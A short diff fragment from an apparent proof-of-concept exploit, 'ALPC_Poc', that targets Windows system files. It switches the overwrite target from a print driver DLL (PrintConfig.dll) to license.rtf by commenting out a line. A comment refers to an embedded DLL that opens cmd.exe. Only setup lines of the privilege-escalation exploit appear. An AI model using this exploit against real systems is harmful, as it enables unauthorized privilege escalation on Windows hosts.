@@ -20,7 +20,7 @@ namespace ALPC_Poc
 
             string taskFolder = @"C:\Windows\Tasks\" + taskFolderJob ;
             string destfile = @"c:\windows\system32\license.rtf";
-            destfile = @"C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_864418199e8fa69d\Amd64\PrintConfig.dll";
+            // destfile = @"C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_864418199e8fa69d\Amd64\PrintConfig.dll";
 
             // Dll byteArray -> it's a simple DLL that contains a method that opens a cmd.exe process
             // see code below
